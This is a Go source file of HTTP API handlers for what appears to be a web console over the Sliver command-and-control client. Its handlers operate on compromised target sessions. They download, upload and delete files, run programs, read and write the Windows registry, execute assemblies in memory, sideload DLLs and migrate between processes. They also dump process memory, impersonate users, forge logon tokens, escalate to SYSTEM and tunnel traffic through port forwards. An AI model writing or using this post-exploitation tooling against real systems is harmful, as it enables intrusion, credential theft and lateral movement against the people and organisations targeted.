package api

import (
	"c2tool/internal/ui/sliver"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"net/http"
	"strconv"
	"strings"
	"time"
)

// sessionIDFromPath returns the {id} path value, erroring if missing.
func (s *Server) sessionID(w http.ResponseWriter, r *http.Request) (string, *sliver.Client) {
	c := s.requireClient(w)
	if c == nil {
		return "", nil
	}
	id := r.PathValue("id")
	if id == "" {
		writeErr(w, http.StatusBadRequest, "invalid session id")
		return "", nil
	}
	return id, c
}

// decodeBody reads a JSON request body into v.
//
// Unknown fields are rejected rather than ignored. A field the server does not
// know is either a typo or a client built against a different version, and in
// both cases silently dropping it means the operator gets a 200 for a request
// that did not do what they asked -- "autoAdd" spelled "auto_add" would run the
// harvest and quietly not store anything. The settings file already refuses
// unknown keys for the same reason; this makes the API agree with it.
func decodeBody(w http.ResponseWriter, r *http.Request, v any) bool {
	dec := json.NewDecoder(r.Body)
	dec.DisallowUnknownFields()
	if err := dec.Decode(v); err != nil {
		writeErr(w, http.StatusBadRequest, "invalid request body: "+err.Error())
		return false
	}
	return true
}

// --- Filesystem ---

func (s *Server) handleFsList(w http.ResponseWriter, r *http.Request) {
	id, c := s.sessionID(w, r)
	if c == nil {
		return
	}
	path := r.URL.Query().Get("path")
	if path == "" {
		p, err := c.Pwd(id)
		if err != nil {
			writeErr(w, http.StatusInternalServerError, err.Error())
			return
		}
		path = p
	}
	dir, err := c.Ls(id, path)
	if err != nil {
		writeErr(w, http.StatusInternalServerError, err.Error())
		return
	}
	writeJSON(w, http.StatusOK, dir)
}

func (s *Server) handleFsPwd(w http.ResponseWriter, r *http.Request) {
	id, c := s.sessionID(w, r)
	if c == nil {
		return
	}
	path, err := c.Pwd(id)
	if err != nil {
		writeErr(w, http.StatusInternalServerError, err.Error())
		return
	}
	writeJSON(w, http.StatusOK, map[string]string{"Path": path})
}

func (s *Server) handleFsCd(w http.ResponseWriter, r *http.Request) {
	id, c := s.sessionID(w, r)
	if c == nil {
		return
	}
	var req struct {
		Path string `json:"path"`
	}
	if !decodeBody(w, r, &req) {
		return
	}
	path, err := c.Cd(id, req.Path)
	if err != nil {
		writeErr(w, http.StatusInternalServerError, err.Error())
		return
	}
	writeJSON(w, http.StatusOK, map[string]string{"Path": path})
}

func (s *Server) handleFsCat(w http.ResponseWriter, r *http.Request) {
	s.handleFsDownload(w, r)
}

// handleFsDownload streams a file from the target to the browser.
//
// The response is the file itself, not JSON. The previous shape was
// {"Data":"<base64>","Name":"..."}, which inflated the payload by a third and
// required the whole thing to exist as a string in Go and again in the browser
// before a single byte could be saved -- so a large file was a memory problem on
// both ends rather than a slow download. The minidump endpoint next door already
// streams for the same reason; this now matches it.
func (s *Server) handleFsDownload(w http.ResponseWriter, r *http.Request) {
	id, c := s.sessionID(w, r)
	if c == nil {
		return
	}
	path := r.URL.Query().Get("path")
	if path == "" {
		writeErr(w, http.StatusBadRequest, "missing path")
		return
	}

	b64, name, err := c.Download(id, path)
	if err != nil {
		writeErr(w, http.StatusInternalServerError, err.Error())
		return
	}

	// Download returns base64 because that is what the RPC hands back. It is
	// decoded here rather than in the client so the bytes are the only thing
	// that leaves this function: nothing downstream sees the inflated form.
	data, err := base64.StdEncoding.DecodeString(b64)
	if err != nil {
		writeErr(w, http.StatusInternalServerError, "the downloaded file could not be decoded")
		return
	}

	// The name comes from the target and is shown in the operator's Downloads
	// folder, so it is reduced to its last path element and stripped of the
	// bytes that would let it break out of the quoted header value. A Windows
	// path arrives with backslashes; url.PathEscape would mangle the name a user
	// sees, so the quoting is done here instead.
	filename := headerSafeFilename(name, path)

	w.Header().Set("Content-Type", "application/octet-stream")
	w.Header().Set("Content-Disposition", "attachment; filename=\""+filename+"\"")
	w.Header().Set("Content-Length", strconv.Itoa(len(data)))
	w.WriteHeader(http.StatusOK)
	_, _ = w.Write(data)
}

// headerSafeFilename reduces a path to a filename that is safe inside a quoted
// Content-Disposition value.
//
// Two things matter. Only the last element is used, so a target-supplied path
// cannot become a directory traversal in the operator's downloads. And quote,
// backslash, CR and LF are dropped, because any of them would end the quoted
// string early and let the remainder be read as another header -- a response
// splitting primitive reachable through a filename.
//
// The result is deliberately not percent-encoded: the browser shows this string
// to the operator, and an escaped name is worse to look at than a filtered one.
func headerSafeFilename(name, path string) string {
	base := name
	if base == "" {
		base = path
	}
	// Windows and POSIX separators both, since the target decides which.
	base = base[strings.LastIndexAny(base, `/\`)+1:]

	var b strings.Builder
	for _, r := range base {
		switch r {
		case '"', '\\', '\r', '\n', 0:
			continue
		}
		b.WriteRune(r)
	}
	// A name that was nothing but filtered characters leaves an empty header,
	// which some browsers reject outright.
	if b.Len() == 0 {
		return "download"
	}
	return b.String()
}

func (s *Server) handleFsUpload(w http.ResponseWriter, r *http.Request) {
	id, c := s.sessionID(w, r)
	if c == nil {
		return
	}
	var req struct {
		Path string `json:"path"`
		Data string `json:"data"`
	}
	if !decodeBody(w, r, &req) {
		return
	}
	data, err := base64.StdEncoding.DecodeString(req.Data)
	if err != nil {
		writeErr(w, http.StatusBadRequest, "invalid base64 data")
		return
	}
	if err := c.Upload(id, req.Path, data); err != nil {
		writeErr(w, http.StatusInternalServerError, err.Error())
		return
	}
	writeJSON(w, http.StatusOK, map[string]bool{"success": true})
}

func (s *Server) handleFsMkdir(w http.ResponseWriter, r *http.Request) {
	id, c := s.sessionID(w, r)
	if c == nil {
		return
	}
	var req struct {
		Path string `json:"path"`
	}
	if !decodeBody(w, r, &req) {
		return
	}
	if err := c.Mkdir(id, req.Path); err != nil {
		writeErr(w, http.StatusInternalServerError, err.Error())
		return
	}
	writeJSON(w, http.StatusOK, map[string]bool{"success": true})
}

func (s *Server) handleFsRm(w http.ResponseWriter, r *http.Request) {
	id, c := s.sessionID(w, r)
	if c == nil {
		return
	}
	path := r.URL.Query().Get("path")
	recursive := r.URL.Query().Get("recursive") == "1" || r.URL.Query().Get("recursive") == "true"
	if path == "" {
		writeErr(w, http.StatusBadRequest, "missing path")
		return
	}
	if err := c.Rm(id, path, recursive); err != nil {
		writeErr(w, http.StatusInternalServerError, err.Error())
		return
	}
	writeJSON(w, http.StatusOK, map[string]bool{"success": true})
}

func (s *Server) handleFsMv(w http.ResponseWriter, r *http.Request) {
	id, c := s.sessionID(w, r)
	if c == nil {
		return
	}
	var req struct {
		Src string `json:"src"`
		Dst string `json:"dst"`
	}
	if !decodeBody(w, r, &req) {
		return
	}
	if err := c.Mv(id, req.Src, req.Dst); err != nil {
		writeErr(w, http.StatusInternalServerError, err.Error())
		return
	}
	writeJSON(w, http.StatusOK, map[string]bool{"success": true})
}

// --- Recon ---

func (s *Server) handleIfconfig(w http.ResponseWriter, r *http.Request) {
	id, c := s.sessionID(w, r)
	if c == nil {
		return
	}
	ifaces, err := c.Ifconfig(id)
	if err != nil {
		writeErr(w, http.StatusInternalServerError, err.Error())
		return
	}
	writeJSON(w, http.StatusOK, map[string]any{"interfaces": ifaces})
}

func (s *Server) handlePs(w http.ResponseWriter, r *http.Request) {
	id, c := s.sessionID(w, r)
	if c == nil {
		return
	}
	procs, err := c.Ps(id)
	if err != nil {
		writeErr(w, http.StatusInternalServerError, err.Error())
		return
	}
	writeJSON(w, http.StatusOK, map[string]any{"processes": procs})
}

func (s *Server) handleKillProcess(w http.ResponseWriter, r *http.Request) {
	id, c := s.sessionID(w, r)
	if c == nil {
		return
	}
	var req struct {
		PID   int32 `json:"pid"`
		Force bool  `json:"force"`
	}
	if !decodeBody(w, r, &req) {
		return
	}
	if err := c.KillProcess(id, req.PID, req.Force); err != nil {
		writeErr(w, http.StatusInternalServerError, err.Error())
		return
	}
	writeJSON(w, http.StatusOK, map[string]bool{"success": true})
}

func (s *Server) handleNetstat(w http.ResponseWriter, r *http.Request) {
	id, c := s.sessionID(w, r)
	if c == nil {
		return
	}
	entries, err := c.Netstat(id)
	if err != nil {
		writeErr(w, http.StatusInternalServerError, err.Error())
		return
	}
	writeJSON(w, http.StatusOK, map[string]any{"entries": entries})
}

func (s *Server) handleGetEnv(w http.ResponseWriter, r *http.Request) {
	id, c := s.sessionID(w, r)
	if c == nil {
		return
	}
	env, err := c.GetEnv(id)
	if err != nil {
		writeErr(w, http.StatusInternalServerError, err.Error())
		return
	}
	writeJSON(w, http.StatusOK, map[string]any{"env": env})
}

func (s *Server) handleSetEnv(w http.ResponseWriter, r *http.Request) {
	id, c := s.sessionID(w, r)
	if c == nil {
		return
	}
	var req struct {
		Key   string `json:"key"`
		Value string `json:"value"`
	}
	if !decodeBody(w, r, &req) {
		return
	}
	if err := c.SetEnv(id, req.Key, req.Value); err != nil {
		writeErr(w, http.StatusInternalServerError, err.Error())
		return
	}
	writeJSON(w, http.StatusOK, map[string]bool{"success": true})
}

func (s *Server) handleUnsetEnv(w http.ResponseWriter, r *http.Request) {
	id, c := s.sessionID(w, r)
	if c == nil {
		return
	}
	key := r.PathValue("key")
	if err := c.UnsetEnv(id, key); err != nil {
		writeErr(w, http.StatusInternalServerError, err.Error())
		return
	}
	writeJSON(w, http.StatusOK, map[string]bool{"success": true})
}

func (s *Server) handleExec(w http.ResponseWriter, r *http.Request) {
	id, c := s.sessionID(w, r)
	if c == nil {
		return
	}
	var req struct {
		Path string   `json:"path"`
		Args []string `json:"args"`
	}
	if !decodeBody(w, r, &req) {
		return
	}
	if req.Path == "" {
		writeErr(w, http.StatusBadRequest, "missing path")
		return
	}
	result, err := c.Execute(id, req.Path, req.Args)
	if err != nil {
		writeErr(w, http.StatusInternalServerError, err.Error())
		return
	}
	writeJSON(w, http.StatusOK, result)
}

func (s *Server) handleScreenshot(w http.ResponseWriter, r *http.Request) {
	id, c := s.sessionID(w, r)
	if c == nil {
		return
	}
	data, err := c.Screenshot(id)
	if err != nil {
		writeErr(w, http.StatusInternalServerError, err.Error())
		return
	}
	writeJSON(w, http.StatusOK, map[string]string{"Data": data})
}

// --- Registry (windows sessions) ---

func (s *Server) handleRegSubKeys(w http.ResponseWriter, r *http.Request) {
	id, c := s.sessionID(w, r)
	if c == nil {
		return
	}
	q := r.URL.Query()
	keys, err := c.RegistryListSubKeys(id, q.Get("hive"), q.Get("path"))
	if err != nil {
		writeErr(w, http.StatusInternalServerError, err.Error())
		return
	}
	writeJSON(w, http.StatusOK, map[string]any{"keys": keys})
}

func (s *Server) handleRegValues(w http.ResponseWriter, r *http.Request) {
	id, c := s.sessionID(w, r)
	if c == nil {
		return
	}
	q := r.URL.Query()
	values, err := c.RegistryListValues(id, q.Get("hive"), q.Get("path"))
	if err != nil {
		writeErr(w, http.StatusInternalServerError, err.Error())
		return
	}
	writeJSON(w, http.StatusOK, map[string]any{"values": values})
}

func (s *Server) handleRegRead(w http.ResponseWriter, r *http.Request) {
	id, c := s.sessionID(w, r)
	if c == nil {
		return
	}
	q := r.URL.Query()
	result, err := c.RegistryRead(id, q.Get("hive"), q.Get("path"), q.Get("key"))
	if err != nil {
		writeErr(w, http.StatusInternalServerError, err.Error())
		return
	}
	writeJSON(w, http.StatusOK, result)
}

func (s *Server) handleRegWrite(w http.ResponseWriter, r *http.Request) {
	id, c := s.sessionID(w, r)
	if c == nil {
		return
	}
	var req struct {
		Hive  string `json:"hive"`
		Path  string `json:"path"`
		Key   string `json:"key"`
		Value string `json:"value"`
		Type  string `json:"type"`
	}
	if !decodeBody(w, r, &req) {
		return
	}
	if err := c.RegistryWrite(id, req.Hive, req.Path, req.Key, req.Value, req.Type); err != nil {
		writeErr(w, http.StatusInternalServerError, err.Error())
		return
	}
	writeJSON(w, http.StatusOK, map[string]bool{"success": true})
}

// --- Extended session operations (P1 features) ---

func (s *Server) handleExecAssembly(w http.ResponseWriter, r *http.Request) {
	id, c := s.sessionID(w, r)
	if c == nil {
		return
	}
	var req struct {
		Assembly string `json:"assembly"` // base64
		Args     string `json:"arguments"`
		Process  string `json:"process"`
	}
	if !decodeBody(w, r, &req) {
		return
	}
	data, err := base64.StdEncoding.DecodeString(req.Assembly)
	if err != nil {
		writeErr(w, http.StatusBadRequest, "invalid base64 assembly")
		return
	}
	res, err := c.ExecuteAssembly(id, data, req.Args, req.Process)
	if err != nil {
		writeErr(w, http.StatusInternalServerError, err.Error())
		return
	}
	writeJSON(w, http.StatusOK, res)
}

func (s *Server) handleSideload(w http.ResponseWriter, r *http.Request) {
	id, c := s.sessionID(w, r)
	if c == nil {
		return
	}
	var req struct {
		Data        string `json:"data"` // base64
		ProcessName string `json:"processName"`
		Args        string `json:"args"`
		EntryPoint  string `json:"entryPoint"`
	}
	if !decodeBody(w, r, &req) {
		return
	}
	data, err := base64.StdEncoding.DecodeString(req.Data)
	if err != nil {
		writeErr(w, http.StatusBadRequest, "invalid base64 data")
		return
	}
	res, err := c.Sideload(id, data, req.ProcessName, req.Args, req.EntryPoint)
	if err != nil {
		writeErr(w, http.StatusInternalServerError, err.Error())
		return
	}
	writeJSON(w, http.StatusOK, res)
}

func (s *Server) handleSpawnDll(w http.ResponseWriter, r *http.Request) {
	id, c := s.sessionID(w, r)
	if c == nil {
		return
	}
	var req struct {
		Data        string `json:"data"` // base64
		ProcessName string `json:"processName"`
		Args        string `json:"args"`
		EntryPoint  string `json:"entryPoint"`
	}
	if !decodeBody(w, r, &req) {
		return
	}
	data, err := base64.StdEncoding.DecodeString(req.Data)
	if err != nil {
		writeErr(w, http.StatusBadRequest, "invalid base64 data")
		return
	}
	res, err := c.SpawnDll(id, data, req.ProcessName, req.Args, req.EntryPoint)
	if err != nil {
		writeErr(w, http.StatusInternalServerError, err.Error())
		return
	}
	writeJSON(w, http.StatusOK, res)
}

func (s *Server) handleMigrate(w http.ResponseWriter, r *http.Request) {
	id, c := s.sessionID(w, r)
	if c == nil {
		return
	}
	var req struct {
		Pid      uint32 `json:"pid"`
		ProcName string `json:"procName"`
	}
	if !decodeBody(w, r, &req) {
		return
	}
	if req.Pid == 0 && req.ProcName == "" {
		writeErr(w, http.StatusBadRequest, "either pid or procName is required")
		return
	}
	if err := c.Migrate(id, req.Pid, req.ProcName); err != nil {
		writeErr(w, http.StatusInternalServerError, err.Error())
		return
	}
	writeJSON(w, http.StatusOK, map[string]bool{"success": true})
}

func (s *Server) handleProcessDump(w http.ResponseWriter, r *http.Request) {
	id, c := s.sessionID(w, r)
	if c == nil {
		return
	}
	var req struct {
		Pid int32 `json:"pid"`
	}
	if !decodeBody(w, r, &req) {
		return
	}
	res, err := c.ProcessDump(id, req.Pid)
	if err != nil {
		writeErr(w, http.StatusInternalServerError, err.Error())
		return
	}
	// The minidump streams straight to the browser as a file download. Base64
	// through JSON inflated a 500 MB dump by a third and forced the whole thing
	// to be buffered as a string before it could be sent.
	filename := fmt.Sprintf("dump-%d-%s.dmp", req.Pid, time.Now().Format("20060102-150405"))
	w.Header().Set("Content-Type", "application/octet-stream")
	w.Header().Set("Content-Disposition", "attachment; filename=\""+filename+"\"")
	w.Header().Set("Content-Length", strconv.Itoa(len(res.Data)))
	w.WriteHeader(http.StatusOK)
	_, _ = w.Write(res.Data)
}

func (s *Server) handleImpersonate(w http.ResponseWriter, r *http.Request) {
	id, c := s.sessionID(w, r)
	if c == nil {
		return
	}
	var req struct {
		Username string `json:"username"`
	}
	if !decodeBody(w, r, &req) {
		return
	}
	if err := c.Impersonate(id, req.Username); err != nil {
		writeErr(w, http.StatusInternalServerError, err.Error())
		return
	}
	writeJSON(w, http.StatusOK, map[string]bool{"success": true})
}

func (s *Server) handleMakeToken(w http.ResponseWriter, r *http.Request) {
	id, c := s.sessionID(w, r)
	if c == nil {
		return
	}
	var req struct {
		Username string `json:"username"`
		Password string `json:"password"`
		Domain   string `json:"domain"`
	}
	if !decodeBody(w, r, &req) {
		return
	}
	if err := c.MakeToken(id, req.Username, req.Password, req.Domain); err != nil {
		writeErr(w, http.StatusInternalServerError, err.Error())
		return
	}
	writeJSON(w, http.StatusOK, map[string]bool{"success": true})
}

func (s *Server) handleRevToSelf(w http.ResponseWriter, r *http.Request) {
	id, c := s.sessionID(w, r)
	if c == nil {
		return
	}
	if err := c.RevToSelf(id); err != nil {
		writeErr(w, http.StatusInternalServerError, err.Error())
		return
	}
	writeJSON(w, http.StatusOK, map[string]bool{"success": true})
}

func (s *Server) handleGetSystem(w http.ResponseWriter, r *http.Request) {
	id, c := s.sessionID(w, r)
	if c == nil {
		return
	}
	var req struct {
		HostingProcess string `json:"hostingProcess"`
	}
	if !decodeBody(w, r, &req) {
		return
	}
	if err := c.GetSystem(id, req.HostingProcess); err != nil {
		writeErr(w, http.StatusInternalServerError, err.Error())
		return
	}
	writeJSON(w, http.StatusOK, map[string]bool{"success": true})
}

func (s *Server) handlePing(w http.ResponseWriter, r *http.Request) {
	id, c := s.sessionID(w, r)
	if c == nil {
		return
	}
	res, err := c.Ping(id)
	if err != nil {
		writeErr(w, http.StatusInternalServerError, err.Error())
		return
	}
	writeJSON(w, http.StatusOK, res)
}

func (s *Server) handleDeleteImplantBuild(w http.ResponseWriter, r *http.Request) {
	c := s.requireClient(w)
	if c == nil {
		return
	}
	name := r.PathValue("name")
	if name == "" {
		writeErr(w, http.StatusBadRequest, "missing build name")
		return
	}
	if err := c.DeleteImplantBuild(name); err != nil {
		writeErr(w, http.StatusInternalServerError, err.Error())
		return
	}
	writeJSON(w, http.StatusOK, map[string]bool{"success": true})
}

func (s *Server) handleRegenerate(w http.ResponseWriter, r *http.Request) {
	c := s.requireClient(w)
	if c == nil {
		return
	}
	var req struct {
		ImplantName string `json:"implantName"`
	}
	if !decodeBody(w, r, &req) {
		return
	}
	res, err := c.Regenerate(req.ImplantName)
	if err != nil {
		writeErr(w, http.StatusInternalServerError, err.Error())
		return
	}
	writeJSON(w, http.StatusOK, res)
}

func (s *Server) handleGetOperators(w http.ResponseWriter, r *http.Request) {
	c := s.requireClient(w)
	if c == nil {
		return
	}
	ops, err := c.GetOperators()
	if err != nil {
		writeErr(w, http.StatusInternalServerError, err.Error())
		return
	}
	writeJSON(w, http.StatusOK, map[string]any{"operators": ops})
}

func (s *Server) handleRegCreateKey(w http.ResponseWriter, r *http.Request) {
	id, c := s.sessionID(w, r)
	if c == nil {
		return
	}
	var req struct {
		Hive string `json:"hive"`
		Path string `json:"path"`
		Key  string `json:"key"`
	}
	if !decodeBody(w, r, &req) {
		return
	}
	if err := c.RegistryCreateKey(id, req.Hive, req.Path, req.Key); err != nil {
		writeErr(w, http.StatusInternalServerError, err.Error())
		return
	}
	writeJSON(w, http.StatusOK, map[string]bool{"success": true})
}

func (s *Server) handleRegDeleteKey(w http.ResponseWriter, r *http.Request) {
	id, c := s.sessionID(w, r)
	if c == nil {
		return
	}
	var req struct {
		Hive string `json:"hive"`
		Path string `json:"path"`
		Key  string `json:"key"`
	}
	if !decodeBody(w, r, &req) {
		return
	}
	if err := c.RegistryDeleteKey(id, req.Hive, req.Path, req.Key); err != nil {
		writeErr(w, http.StatusInternalServerError, err.Error())
		return
	}
	writeJSON(w, http.StatusOK, map[string]bool{"success": true})
}

// --- Port forwarding ---

func (s *Server) handlePortfwdList(w http.ResponseWriter, r *http.Request) {
	c := s.requireClient(w)
	if c == nil {
		return
	}
	pfm, err := c.PortForwards()
	if err != nil {
		writeErr(w, http.StatusInternalServerError, err.Error())
		return
	}
	writeJSON(w, http.StatusOK, map[string]any{"forwards": pfm.List()})
}

func (s *Server) handlePortfwdStart(w http.ResponseWriter, r *http.Request) {
	c := s.requireClient(w)
	if c == nil {
		return
	}
	var req struct {
		SessionID  string `json:"session_id"`
		BindAddr   string `json:"bind_addr"`
		BindPort   uint32 `json:"bind_port"`
		RemoteHost string `json:"remote_host"`
		RemotePort uint32 `json:"remote_port"`
	}
	if !decodeBody(w, r, &req) {
		return
	}
	if req.SessionID == "" || req.RemotePort == 0 {
		writeErr(w, http.StatusBadRequest, "session_id and remote_port required")
		return
	}
	pfm, err := c.PortForwards()
	if err != nil {
		writeErr(w, http.StatusInternalServerError, err.Error())
		return
	}
	pf, err := pfm.Forward(req.SessionID, req.BindAddr, req.BindPort, req.RemotePort, req.RemoteHost)
	if err != nil {
		writeErr(w, http.StatusInternalServerError, err.Error())
		return
	}
	writeJSON(w, http.StatusOK, map[string]any{
		"success":   true,
		"localAddr": pf.LocalAddr,
		"localPort": pf.LocalPort,
	})
}

func (s *Server) handlePortfwdStop(w http.ResponseWriter, r *http.Request) {
	c := s.requireClient(w)
	if c == nil {
		return
	}
	port, err := strconv.ParseUint(r.PathValue("port"), 10, 32)
	if err != nil {
		writeErr(w, http.StatusBadRequest, "invalid port")
		return
	}
	pfm, err := c.PortForwards()
	if err != nil {
		writeErr(w, http.StatusInternalServerError, err.Error())
		return
	}
	if err := pfm.Stop(uint32(port)); err != nil {
		writeErr(w, http.StatusInternalServerError, err.Error())
		return
	}
	writeJSON(w, http.StatusOK, map[string]bool{"success": true})
}
